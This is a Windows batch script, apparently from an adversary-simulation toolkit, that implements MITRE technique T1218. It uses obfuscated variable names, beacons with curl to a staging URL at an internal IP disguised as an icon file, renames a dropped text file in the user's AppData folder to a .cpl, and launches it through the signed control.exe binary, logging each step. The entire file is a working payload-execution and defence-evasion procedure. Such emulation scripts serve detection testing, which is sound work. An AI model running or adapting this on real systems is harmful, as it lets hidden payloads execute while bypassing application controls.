@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET cjlhrs=%APPDATA%\9105\4ff0ad98
SET lfkyq=https://10.0.0.49
SET ygklp=https://10.0.0.49/stage/2/icon.png?9105-7
SET jnvbwx=BALAM-S2B
SET rkmswd=7
SET qrkwf=firelox.txt
SET szcxmq=9105
SET hxglp=%APPDATA%\!rkmswd!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: heartbeat_start=!ygklp!>> "!hxglp!" 2>nul
curl -k -s -o nul "!ygklp!"
echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: heartbeat_complete=!ERRORLEVEL!>> "!hxglp!" 2>nul

SET wd_result=0
SET jb_err=
if exist "!cjlhrs!\!qrkwf!" (
    SET htgvop=!cjlhrs!\file.cpl
    echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: rename_start=!cjlhrs!\!qrkwf!>> "!hxglp!" 2>nul
    move /y "!cjlhrs!\!qrkwf!" "!htgvop!" >nul 2>&1
    if exist "!htgvop!" (
        echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: rename_complete=!htgvop!>> "!hxglp!" 2>nul
        echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: process_start=control.exe>> "!hxglp!" 2>nul
        start /b control.exe "!htgvop!"
        if !ERRORLEVEL! EQU 0 (
            SET wd_result=1
        ) else (
            SET jb_err=process_fail
        )
        echo [!DATE! !TIME!][DEBUG][!jnvbwx!]: process_complete=!ERRORLEVEL!>> "!hxglp!" 2>nul
    ) else (
        SET jb_err=rename_fail
    )
) else (
    SET jb_err=file_not_found
)
echo [!DATE! !TIME!][!jnvbwx!]: !rkmswd!-!szcxmq!-T1218|Signed Binary Proxy Execution=!wd_result!::!jb_err!>> "!hxglp!" 2>nul